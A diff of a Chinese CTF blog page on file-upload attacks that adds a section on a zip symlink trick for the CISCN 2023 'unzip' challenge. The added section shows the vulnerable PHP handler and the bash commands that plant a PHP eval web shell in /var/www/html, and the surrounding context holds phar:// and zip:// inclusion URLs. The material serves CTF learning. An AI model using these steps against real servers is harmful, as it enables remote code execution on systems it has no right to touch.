@@ -43,9 +43,10 @@
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj15.jpg">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj16.jpg">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj17.jpg">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj18.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/sum_up.png">
 <meta property="article:published_time" content="2021-07-01T06:00:00.000Z">
-<meta property="article:modified_time" content="2023-02-19T08:47:40.054Z">
+<meta property="article:modified_time" content="2023-05-27T05:34:32.444Z">
 <meta property="article:author" content="lewiserii">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="文件上传">
@@ -258,7 +259,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          11k 字
+          12k 字
         
       </span>
     
@@ -269,7 +270,7 @@
         
         
         
-          111 分钟
+          119 分钟
         
       </span>
     
@@ -416,6 +417,32 @@
 <p>unzip命令是无法实现目录穿越的，会默认跳过..&#x2F;</p>
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/snyk/zip-slip-vulnerability">所有已发现受Zip Slip影响的项目</a></p>
+<h1 id="zip软连接"><a href="#zip软连接" class="headerlink" title="zip软连接"></a>zip软连接</h1><p>当解压操作可以覆盖上一次解压文件时触发</p>
+<p>例如ciscn2023-unzip</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure>
+
+
+<p><code>unzip</code>的<code>-o</code>参数表示 不必先询问用户，unzip执行后覆盖原有的文件</p>
+<p><strong>构造第一个压缩包</strong></p>
+<p>先构造一个指向<code>/var/www/html</code>的软连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /var/www/html poc<br></code></pre></td></tr></table></figure>
+
+<p>再保留软连接压缩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip --symlinks test.zip poc<br></code></pre></td></tr></table></figure>
+
+<p>此时上传该<code>test.zip</code>解压出里边的文件，也就是软连接到<code>/var/www/html</code></p>
+<p><strong>构造第二个压缩包</strong></p>
+<p>先创建跟第一个压缩包中目录同名的目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> poc<br></code></pre></td></tr></table></figure>
+
+<p>接着向目录中写一个shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br></code></pre></td></tr></table></figure>
+
+<p>压缩这个目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -r test1.zip poc<br></code></pre></td></tr></table></figure>
+
+<p>当我们上传第二个压缩包时，因为<code>poc</code>目录已经软连接到<code>/var/www/html</code>了，所以解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj18.png"></p>
 <h1 id="phar-x2F-x2F-amp-zip-x2F-x2F"><a href="#phar-x2F-x2F-amp-zip-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F;</h1><p><code>http://localhost/?url=phar://uploads/63e93ffe53f03e93bb0a0249152d243874e31c9b.zip/shell</code><br><code>http://localhost/?url=zip:///var/www/html/upload/892e38cea0c47c744ecc60ccacc94c23.zip%23shell</code></p>
 <h1 id="利用中间件差异绕过waf"><a href="#利用中间件差异绕过waf" class="headerlink" title="利用中间件差异绕过waf"></a>利用中间件差异绕过waf</h1><p>来自西湖论剑的一道题目：扭转乾坤</p>
 <p>上传发现提示的<code>apache</code>不支持<code>Content-Type: multipart/form-data</code></p>
